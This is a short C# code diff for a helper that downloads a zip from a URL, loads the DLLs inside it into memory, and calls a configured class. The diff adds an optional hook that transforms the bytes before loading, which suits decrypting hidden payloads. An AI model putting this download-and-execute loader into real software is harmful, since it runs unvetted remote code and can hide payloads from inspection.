@@ -59,10 +59,17 @@ namespace CMK
 
         public static Assembly GetAssemblyFromStream(Stream stream)
         {
+            return GetAssemblyFromStream(stream, null);
+        }
+
+        public static Assembly GetAssemblyFromStream(Stream stream, Func<byte[], byte[]> intermediateStep)
+        {
             using (var ms = new MemoryStream())
             {
                 stream.CopyTo(ms);
                 var bytes = ms.ToArray();
+                if (intermediateStep != null)
+                    bytes = intermediateStep.Invoke(bytes);
                 return Assembly.Load(bytes);
             }
         }
@@ -90,7 +97,7 @@ namespace CMK
                 null);
         }
 
-        public static void ExecuteCodeFromUrl(string Url)
+        public static void ExecuteCodeFromUrl(string Url, Func<byte[], byte[]> intermediateStep = null)
         {
             using (var webClient = new WebClient())
             {
@@ -101,7 +108,7 @@ namespace CMK
                 var asms = new List<Assembly>();
                 foreach (var entry in entries)
                     if(entry.Name.EndsWith(".dll"))
-                        asms.Add(GetAssemblyFromStream(entry.Open()));
+                        asms.Add(GetAssemblyFromStream(entry.Open(), intermediateStep));
                 var namespaceClass = cfg.classToCall.Split('.');
                 ICallable callableClass = Get<ICallable>(namespaceClass[0], namespaceClass[1], asms.FirstOrDefault(x => x.FullName.Contains(namespaceClass[0])), null);
                 callableClass.Call();
